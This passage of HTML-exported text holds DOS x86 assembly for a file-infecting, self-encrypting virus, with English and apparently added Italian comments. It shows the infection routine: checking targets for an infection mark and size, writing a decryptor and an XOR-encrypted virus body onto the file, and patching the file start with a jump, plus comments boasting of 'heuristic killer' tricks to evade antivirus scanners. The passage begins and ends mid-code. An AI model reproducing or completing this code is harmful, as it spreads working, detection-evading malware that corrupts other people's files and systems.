mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>xchg<span
style='mso-tab-count:1'>  </span>bx,ax<span style='mso-tab-count:3'>             </span>;put
handle in bx<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>push<span
style='mso-tab-count:1'>  </span>3f00h<span style='mso-tab-count:3'>             </span>;!heuristic
killer!<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;----- read 1st five bytes<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>cx,5<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>lea<span
style='mso-tab-count:1'>   </span>dx,[bp+oldbytes]<span style='mso-tab-count:
1'>  </span>;store in oldbytes<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>pop<span
style='mso-tab-count:1'>   </span>ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>int<span
style='mso-tab-count:1'>   </span>21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;----- check for misnamed .EXE (fuck you microsoft) -
anti-heuristic<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>ax,word ptr [bp+oldbytes]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>add<span
style='mso-tab-count:1'>   </span>ax,0101h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>cmp<span
style='mso-tab-count:1'>   </span>word ptr ax,'[N'<span style='mso-tab-count:
1'>  </span>;check first 2 bytes<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span></span></b><b><span
lang=FR style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:FR'>je<span
style='mso-tab-count:1'>    </span>close_file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'><span style='mso-tab-count:2'>            </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:EN-US'>cmp<span
style='mso-tab-count:1'>   </span>word ptr ax,'N['<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span></span></b><b><span
lang=FR style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:FR'>je<span
style='mso-tab-count:1'>    </span>close_file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;----- check for infection mark<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>cmp<span
style='mso-tab-count:1'>   </span>word ptr [bp+oldbytes+3],'66'<span
style='mso-tab-count:1'> </span>;look for 66<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span></span></b><b><span
lang=FR style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:FR'>je<span
style='mso-tab-count:1'>    </span>close_file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;----- check size - if &gt; 60000 then close<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>cmp<span
style='mso-tab-count:1'>   </span>word ptr [bp+dta+1ah], 60000<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>ja<span
style='mso-tab-count:1'>    </span>close_file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;----- seek to eof - 7<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>ax,4202h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>cx,-1<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>dx,-7<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>int<span
style='mso-tab-count:1'>   </span>21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;----- (eof-7)+7=eof<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>cx,7<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>add<span
style='mso-tab-count:1'>   </span>ax,cx<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;----- calculate jump<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>sub<span
style='mso-tab-count:1'>   </span>ax,3<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>word ptr [bp+jump_bytes+1],ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;----- read 7 bytes<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>ah,3fh<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>cx,7<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>lea<span
style='mso-tab-count:1'>   </span>dx,[bp+buffer]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>int<span
style='mso-tab-count:1'>   </span>21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;----- add virus size to checksum<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>add<span
style='mso-tab-count:1'>   </span>word ptr [bp+buffer+5],code_length<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>;----- ricava chiave e la salva in variabile key<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style='mso-tab-count:2'>            </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#B32D9D;mso-ansi-language:
EN-US'>push<span style='mso-tab-count:1'>  </span>4000h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#B32D9D'>mov<span
style='mso-tab-count:1'>   </span>ah,2ch<span style='mso-tab-count:3'>                  </span>;
ricava ora<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style='mso-tab-count:2'>            </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#B32D9D;mso-ansi-language:
EN-US'>int<span style='mso-tab-count:1'>   </span>21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>word ptr [bp+key1],dx<span style='mso-tab-count:
1'>   </span>; secondi + centesimi<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>;----- scrive “unencrypted portion” (il
loader del decryptor)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>cx,virus_start-start<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>lea<span
style='mso-tab-count:1'>   </span>dx,[bp+start]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#B32D9D'>pop<span
style='mso-tab-count:1'>   </span>ax<span style="mso-spacerun:
yes">                      </span>; collegato al push 4000h precedente<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style='mso-tab-count:2'>            </span>int<span
style='mso-tab-count:1'>   </span>21h<span style="mso-spacerun:
yes">                     </span>; scrive CX bytes partendo da DX<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>;----- cripta (stesso metodo del decryptor) e copia virus<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style='mso-tab-count:2'>            </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#B32D9D;mso-ansi-language:
EN-US'>push<span style='mso-tab-count:1'>  </span>4001h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>cx,(key1-virus_start+1)/2<span
style='mso-tab-count:1'>    </span>; lunghezza codice (a word)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>dx,word ptr [bp+key1]<span style='mso-tab-count:
1'>   </span><span style="mso-spacerun: yes">      </span>; in DX la chiave<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>lea<span
style='mso-tab-count:1'>   </span>si,[bp+virus_start]<span style='mso-tab-count:
1'>     </span><span style="mso-spacerun: yes">      </span>; sorgente: virus
start<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#B32D9D'>lea<span
style='mso-tab-count:1'>   </span>di,[bp+crypt_buffr]<span style='mso-tab-count:
1'>     </span><span style="mso-spacerun: yes">      </span>; destinazione:
buffer<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:FR'>xor_loop2:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:FR'><span style='mso-tab-count:2'>            </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#B32D9D'>lodsw<span
style='mso-tab-count:1'> </span><span style="mso-spacerun: yes">    </span><span
style='mso-tab-count:3'>              </span>; carica word da sorgente<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style='mso-tab-count:2'>            </span></span></b><b><span
lang=FR style='mso-fareast-font-family:"MS Mincho";color:#B32D9D;mso-ansi-language:
FR'>xor<span style='mso-tab-count:1'>   </span>ax,dx<span style='mso-tab-count:
3'>             </span>; cripta<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:FR'><span style='mso-tab-count:2'>            </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#B32D9D'>stosw<span
style='mso-tab-count:4'>                   </span>; lo copia in destinazione<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style='mso-tab-count:2'>            </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#B32D9D;mso-ansi-language:
EN-US'>loop<span style='mso-tab-count:1'>  </span>xor_loop2<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'>;----- write encrypted shit (scrive il buffer criptato, vedi in
fondo al codice)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style='mso-tab-count:2'>            </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#B32D9D;mso-ansi-language:
EN-US'>mov<span style='mso-tab-count:1'>   </span>cx,key1-virus_start<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>lea<span
style='mso-tab-count:1'>   </span>dx,[bp+crypt_buffr]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style="mso-spacerun: yes"> </span><span
style='mso-tab-count:2'>           </span>pop<span style='mso-tab-count:1'>   </span>ax<span
style='mso-tab-count:3'>                </span>;!heuristic killer! (sic !) AH =
40h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>dec<span
style='mso-tab-count:1'>   </span>ax<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>push<span
style='mso-tab-count:1'>  </span>4000h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>int<span
style='mso-tab-count:1'>   </span>21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'>;----- write more unencrypted shit
(scrive il decryptor “unencripted”)<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#B32D9D'>mov<span
style='mso-tab-count:1'>   </span>cx,f_attr-key1<span style='mso-tab-count:
2'>          </span>; decryptor e altri bytes che devono<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style='mso-tab-count:2'>            </span>lea<span
style='mso-tab-count:1'>   </span>dx,[bp+key1]<span style='mso-tab-count:2'>            </span>;
rimanere non crittati<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D'><span style='mso-tab-count:2'>            </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#B32D9D;mso-ansi-language:
EN-US'>pop<span style='mso-tab-count:1'>   </span>ax<span style='mso-tab-count:
3'>                </span><span style="mso-spacerun: yes">      </span>; AH =
40h <o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
color:#B32D9D;mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>int<span
style='mso-tab-count:1'>   </span>21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;----- seek to start of file<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>ax,4200h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span></span></b><b><span
lang=FR style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:FR'>xor<span
style='mso-tab-count:1'>   </span>cx,cx<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=FR style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:FR'><span style='mso-tab-count:2'>            </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";mso-ansi-language:EN-US'>cwd<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>push<span
style='mso-tab-count:1'>  </span>4000h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>int<span
style='mso-tab-count:1'>   </span>21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;----- write the jump<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>mov<span
style='mso-tab-count:1'>   </span>cx,5<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>lea<span
style='mso-tab-count:1'>   </span>dx,[bp+jump_bytes]<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>pop<span
style='mso-tab-count:1'>   </span>ax<span style='mso-tab-count:3'>                </span>;!heuristic
killer!<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>int<span
style='mso-tab-count:1'>   </span>21h<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>close_file:<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'>;----- restore date/time<o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText><b><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";
mso-ansi-language:EN-US'><span style='mso-tab-count:2'>            </span>push<span
style='mso-tab-count:1'>  </span>5701h<o:p></o:p></span></b></p>

